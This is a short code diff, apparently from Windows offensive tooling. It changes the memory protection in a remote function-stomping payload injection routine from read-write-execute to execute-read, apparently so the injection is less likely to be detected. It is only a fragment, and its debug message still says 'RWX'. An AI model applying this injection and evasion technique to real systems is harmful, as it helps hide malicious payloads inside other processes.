@@ -61,7 +61,7 @@ BOOL WritePayloadViaRemoteFunctionStomping(OUT PVOID* pAddress, IN PBYTE pPayloa
 	}
 
 	// Change memory protection to allow execution
-	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
+	if (!VirtualProtectEx(hProcess, *pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
 		DebugPrint("[!] VirtualProtectEx [RWX] Failed With Error: %d \n", GetLastError());
 		return FALSE;
 	}
